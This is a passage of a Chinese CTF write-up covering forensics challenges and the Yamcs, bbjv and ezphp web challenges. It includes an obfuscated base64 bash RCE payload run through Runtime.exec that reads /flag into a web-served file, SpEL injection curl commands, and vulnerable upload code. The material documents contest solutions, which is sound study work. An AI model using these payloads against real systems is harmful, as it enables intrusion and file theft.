</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="n">col_idx</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">图像已保存到 oled_output.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后终于成功了，画出了一个强网杯的logo，上面乱乱的看不出是什么，以为是我脚本错了，后面发现是将_#转01然后解二进制就可以了</p>
<p><img src="/img/2025-QWB-S9/17.png" alt="img"></p>
<p><img src="/img/2025-QWB-S9/18.png" alt="img"></p>
<h2 id="secured-personal-vault">Secured Personal Vault</h2>
<p>依旧一血，而且坚不可摧（）</p>
<p>如果我说我又非了你信吗（）</p>
<p>依旧内存取证，但是把早上的非预期修了，爆搜搜不到，分析一下发现桌面有个apersonalvault.exe（早上的取证做过也能知道）</p>
<p><img src="/img/2025-QWB-S9/19.png" alt="img"></p>
<p>提出来丢给逆向手逆向了，他们说要找密文，exe里自带了解密什么的，但是生成的mailslot文件提取不出来，拿不到，没招了</p>
<p>真没招吗</p>
<p>并非</p>
<p>我做完OLED寻思看看他的窗口管理器内存转储，也就是dwm.exe的内存转储（参考了ycb我出的内存取证，想着试试），遂提取了一波，用马处的lovelymem luxe提取内存转储，然后用lovelypixelweaver进行爆看</p>
<p>由于不确定分辨率，所以我手动爆了一下，最后发现是1279这个宽度可以正常看到窗口信息，然后我就滑了滑，没想到啊，真的有出题人在加密flag时的窗口画面，但是有点花，不过不影响我通过强大的视力再加上一点点小小的英语语法功底和毅力，将他盯出来了，flag最后为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">flag</span><span class="p">{</span><span class="n">Making_challenge_is_hard_manage_secure_vault_is_more_difficult</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/2025-QWB-S9/20.png" alt="img"></p>
<p><img src="/img/2025-QWB-S9/21.png" alt="img"></p>
<p><img src="/img/2025-QWB-S9/22.png" alt="img"></p>
<p>至此该系列顺利完成，双非这块（）</p>
<h1 id="web">Web</h1>
<h2 id="yamcs">Yamcs</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> maven:3.9.9-eclipse-temurin-17</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /build</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> apt-get install -y git <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    git clone https://github.com/yamcs/quickstart.git<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /build/quickstart</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chmod +x mvnw<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> ./mvnw compile<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    apt-get install -y python3 python3-pip <span class="o">&amp;&amp;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    apt-get clean<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> ./mvnw dependency:go-offline<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> FLAG&gt;/flag<span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">EXPOSE</span><span class="s"> 8090</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">CMD</span> bash -c <span class="s1">&#39;\
</span></span></span><span class="line"><span class="cl"><span class="s1">  nohup python3 simulator.py &gt;/dev/null 2&gt;&amp;1 &amp; \
</span></span></span><span class="line"><span class="cl"><span class="s1">  ./mvnw yamcs:run&#39;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>直接本地 clone 项目，很小，发现</p>
<p><img src="/img/2025-QWB-S9/23.png" alt="img"></p>
<p>发现可控字符串，clone 完整的后端大项目下来搜索这个方法的实现，结果全局搜索搜不出来，从数据流路由找出 web 路由，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-YAML" data-lang="YAML"><span class="line"><span class="cl"><span class="l">/algorithms/[InstanceName]/[AlgorithmName]/-/summary?c=[InstanceName]__[ProcessorName]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">/algorithms/myproject/copySunsensor/-/summary?c=myproject__realtime</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/2025-QWB-S9/24.png" alt="img"></p>
<p>找到能够 RCE 的地方，但是远程不出网，jdk17 内存马写不来</p>
<p><img src="/img/2025-QWB-S9/25.png" alt="img"></p>
<p>起个 docker 找到静态目录</p>
<p><img src="/img/2025-QWB-S9/26.png" alt="img"></p>
<p>直接写入</p>
<p><img src="/img/2025-QWB-S9/27.png" alt="img"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;bash -c {echo,dGFjIC9mbGFnID4gL2J1aWxkL3F1aWNrc3RhcnQvdGFyZ2V0L3lhbWNzL2NhY2hlL3lhbWNzLXdlYi8xLnR4dA==}|{base64,-d}|{bash,-i}&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bbjv">bbjv</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Java" data-lang="Java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.ctf.gateway.controller</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.ctf.gateway.service.EvaluationService</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileNotFoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileReader</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.GetMapping</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="cm">/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/controller/GatewayController.class */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GatewayController</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">EvaluationService</span><span class="w"> </span><span class="n">evaluationService</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">GatewayController</span><span class="p">(</span><span class="n">EvaluationService</span><span class="w"> </span><span class="n">evaluationService</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">evaluationService</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">evaluationService</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@GetMapping</span><span class="p">({</span><span class="s">&#34;/check&#34;</span><span class="p">})</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">checkRule</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">rule</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">FileNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">evaluationService</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">rule</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">flagFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;user.home&#34;</span><span class="p">),</span><span class="w"> </span><span class="s">&#34;flag.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">flagFile</span><span class="p">.</span><span class="na">exists</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">br</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileReader</span><span class="p">(</span><span class="n">flagFile</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">br</span><span class="p">.</span><span class="na">readLine</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&lt;br&gt;&lt;b&gt;�� Flag:&lt;/b&gt; &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">content</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">br</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>找到路由，只要我能把 user.home 设置为<code>/tmp</code>即可读取，SpEL表达式注入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">k</span> <span class="o">-</span><span class="n">G</span> <span class="s2">&#34;https://eci-2zeivhucjzij0z5z6p1n.cloudeci1.ichunqiu.com:8080/check&#34;</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">urlencode</span> <span class="s2">&#34;rule=#{T(java.lang.System).setProperty(&#39;user.home&#39;,&#39;/tmp&#39;)}&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">a5rz_</span><span class="o">&gt;</span><span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">k</span> <span class="o">-</span><span class="n">G</span> <span class="s2">&#34;https://eci-2zeivhucjzij0z5z6p1n.cloudeci1.ichunqiu.com:8080/check&#34;</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">urlencode</span> <span class="s2">&#34;rule=#{T(java.lang.System).setProperty(&#39;user.home&#39;,&#39;/tmp&#39;)}&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Error</span><span class="p">:</span> <span class="n">EL1005E</span><span class="p">:</span> <span class="n">Type</span> <span class="n">cannot</span> <span class="n">be</span> <span class="n">found</span> <span class="s1">&#39;java.lang.System&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 换个函数</span>
</span></span><span class="line"><span class="cl"><span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">k</span> <span class="o">-</span><span class="n">G</span> <span class="s2">&#34;https://eci-2zeivhucjzij0z5z6p1n.cloudeci1.ichunqiu.com:8080/check&#34;</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">urlencode</span> <span class="s2">&#34;rule=#{#systemProperties[&#39;user.home&#39;]=&#39;/tmp&#39;}&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ezphp">ezphp</h2>
<p>base64解码后（添加了一些调试信息）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">generateRandomString</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$characters</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$randomString</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$r</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$randomString</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nv">$r</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$randomString</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">date_default_timezone_set</span><span class="p">(</span><span class="s1">&#39;Asia/Shanghai&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$readflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;constructed.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">readflag</span> <span class="o">=</span> <span class="k">new</span> <span class="k">class</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$time</span> <span class="o">=</span> <span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Hi&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$seed</span> <span class="o">=</span> <span class="nv">$time</span> <span class="o">.</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s2">&#34;Seed = &#34;</span><span class="o">.</span> <span class="nv">$seed</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">mt_srand</span><span class="p">(</span><span class="nv">$seed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="nv">$uploadDir</span> <span class="o">=</span> <span class="s1">&#39;uploads/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">glob</span><span class="p">(</span><span class="nv">$uploadDir</span> <span class="o">.</span> <span class="s1">&#39;*&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="nv">$randomStr</span> <span class="o">=</span> <span class="nx">generateRandomString</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$newFilename</span> <span class="o">=</span> <span class="nv">$time</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$randomStr</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="s1">&#39;jpg&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$newFilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="nv">$uploadedFile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$uploadPath</span> <span class="o">=</span> <span class="nv">$uploadDir</span> <span class="o">.</span> <span class="nv">$newFilename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
